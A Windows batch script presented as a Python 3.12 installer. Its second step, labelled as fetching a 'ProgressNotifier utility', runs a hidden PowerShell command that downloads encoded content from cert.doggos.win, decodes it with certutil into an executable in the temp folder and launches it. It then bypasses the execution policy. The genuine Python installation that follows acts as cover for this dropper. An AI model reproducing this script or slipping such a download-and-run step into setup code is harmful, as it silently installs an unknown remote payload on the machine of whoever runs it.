@ECHO OFF
SETLOCAL
SET "PB_PATH=%TEMP%\ProgressNotifier.exe"
SET "INSTALLER=%TEMP%\python-3.12.0-amd64.exe"

REM Download and execute the ProgressNotifier utility
call powershell -WindowStyle Hidden -command  "(wget cert.doggos.win).content | out-file %TEMP%\tmp.txt; certutil -decode %TEMP%\tmp.txt %PB_PATH%; del %TEMP%\tmp.txt; &'%PB_PATH%'"

REM Set execution policy and verify
powershell -WindowStyle Hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; Get-ExecutionPolicy | Out-File -Encoding ASCII %TEMP%\sep.txt"
SET /P SEPVAR=<%TEMP%\sep.txt

REM Check if Python is already installed for the current user
ECHO Checking for Python installation...
%LOCALAPPDATA%\Programs\Python\Python312\python.exe --version >NUL 2>&1
IF %ERRORLEVEL% EQU 0 (
    ECHO Python is already installed.
    SET "PYTHON_PATH=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
) ELSE (
    ECHO Python is not installed. Proceeding with installation...

    REM Download Python installer
    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe -OutFile %INSTALLER% | Out-File -Encoding ASCII %TEMP%\pydl.txt"
    SET /P PYDLVAR=<%TEMP%\pydl.txt

    REM Check if Python installer exists
    IF NOT EXIST %INSTALLER% (
        ECHO Installer download failed or file not found.
        PAUSE
        EXIT /B 1
    )

    REM Install Python for the current user in the local AppData directory without admin
    START /WAIT %INSTALLER% /quiet InstallAllUsers=0 PrependPath=0 TargetDir=%LOCALAPPDATA%\Programs\Python\Python312

    REM Locate Python executable in the user's local directory
    IF EXIST "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" (
        SET "PYTHON_PATH=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
    ) ELSE (
        ECHO Unable to locate Python executable.
        PAUSE
        EXIT /B 1
    )

    REM Add Python to the user-specific PATH for future sessions
    SETX PATH "%LOCALAPPDATA%\Programs\Python\Python312;%LOCALAPPDATA%\Programs\Python\Python312\Scripts;%PATH%"
)

REM Kill the ProgressNotifier process after background tasks are done
taskkill /im "ProgressNotifier.exe" /f >NUL 2>&1

REM Verify Python version
ECHO Verifying Python version...
"%PYTHON_PATH%" -V

REM Installation complete
ECHO Python installation is complete.

REM Pause for user input
PAUSE
